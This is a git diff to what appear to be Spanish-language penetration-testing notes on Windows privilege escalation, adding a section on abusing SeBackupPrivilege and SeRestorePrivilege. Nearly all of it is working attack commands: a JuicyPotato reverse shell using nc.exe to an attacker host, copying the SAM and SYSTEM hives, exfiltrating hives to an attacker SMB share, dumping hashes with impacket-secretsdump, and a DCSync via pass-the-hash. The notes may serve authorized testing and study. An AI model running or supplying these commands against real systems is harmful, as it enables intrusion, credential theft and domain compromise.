@@ -195,6 +195,47 @@ PASOS con 'JuicyPotato' para ejecuta una Reverse Shell:
 ❯ .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Windows\Temp\nc.exe -e cmd IP_Kali 4444"
 ```
 
+```powershell 
+3. 'SeBackupPrivilege y SeRestorePrivilege' = Permite leer cualquier archivo del sistema, ignorando sus permisos NTFS. Se puede copiar archivos críticos del sistema como el 'SAM, SYSTEM o NTDS.dit', incluso si no tiene permisos NTFS explícitos para ello. Estos archivos contienen información sensible como: 'Hashes de contraseñas locales, Credenciales de cuentas del dominio (si es un DC) y Configuraciones de seguridad'
+
+# Forma de explotar 
+❯ https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md        
+
+
+++++++++++++++++++++++++++++++++++
+
+## FORMA 1
+Pasos:   
+❯ reg save hklm\sam C:\windows\temp\sam.hive           # Hacer una copia de la SAM en Windows y descargarlo 
+❯ reg save hklm\system C:\windows\temp\system.hive     # Hacer una copia del system en Windows y descargarlo
+
+❯ impacket-secretsdump -sam sam.hive -system system.hive LOCAL   
+# Dumpear los hashes de los usuarios desde Kali con los archivos obtenidos  
+
+
+++++++++++++++++++++++++++++++++++
+
+## FORMA 2
+Pasos:
+# Descargar la tool 
+❯ https://github.com/horizon3ai/backup_dc_registry/blob/main/reg.py    
+
+❯ python3 reg.py user:'passwd'@IP backup -p '\\IP\smbFolder'
+	# user:passwd = Credenciales validas del usuario que se encuentra en el grupo 'Backup Operators'
+	# IP = Dirección IP del DC
+	# \\IP\share = Recurso compartido con la IP de Kali para recibir los archivos a descargar 
+❯ impacket-smbserver smbFolder $(pwd) -smb2support    # Crear un server para recibir los archivos 'SAM, SECURITY y SYSTEM' y así poder hacer el dumpeo 
+
+❯ impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL     # Dumpear los hashes de los usuarios desde Kali con los archivos obtenidos 
+
+❯ impacket-secretsdump 'domain1.corp/user'@IP_DC -hashes :64fbae31cc352fc26af97cbdef151e03 # Hacer un DCSync
+	# hashes = Hash ':NT' del usuario 
+
+Notas:
+	1. Crear el recuros compartido antes de ejecutar la herramineta 'reg.py'
+	2. La ejecución de la herramienta 'reg.py' y el comando de 'impacket-smbserver' deben de ser en el mismo directorio en Kali para evitar un error 
+```
+
 ## Grupos Windows para escalar 
 
 ```bash 
